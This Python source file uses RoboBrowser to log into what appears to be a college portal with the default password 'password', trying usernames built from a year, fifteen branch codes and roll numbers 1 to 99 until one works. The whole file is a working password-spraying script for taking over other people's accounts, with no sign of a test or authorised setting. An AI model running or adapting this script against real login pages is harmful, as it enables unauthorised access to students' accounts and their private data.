from robobrowser import RoboBrowser

from params import getParams

def login(type, account):
    params = getParams(type)
    browser = RoboBrowser(history=True, parser='html.parser')
    browser.open(params['loginUrl'])
    form = browser.get_form(0)

    if not form:
        raise ValueError("Couldn't login")

    form[params['username_field']].value = account['username']
    form[params['password_field']].value = account['password']
    browser.submit_form(form)
    browser.open(params['notifsUrl'])
    soup = browser.parsed
    ul = soup.find('ul',attrs={'class':'timeline'})
    return True if ul else False  

def findAccount(type):
    params = getParams(type)
    branches = ['CO', 'SE', 'IT', 'EC', 'EL', 'EE', 'CE', 'PS', 'BT', 'EP', 'MC', 'ME', 'AM', 'PE', 'EN']
    for branch in branches:
        for i in range(1, 100):
            rollno = '00' + str(i) if i < 10 else '0' + str(i)
            account = {
                'username': params['year'] + '/' + branch + '/' + rollno,
                'password': 'password'
            }
            print("Trying with account: {}".format(account['username']))
            if login(type, account):
                return account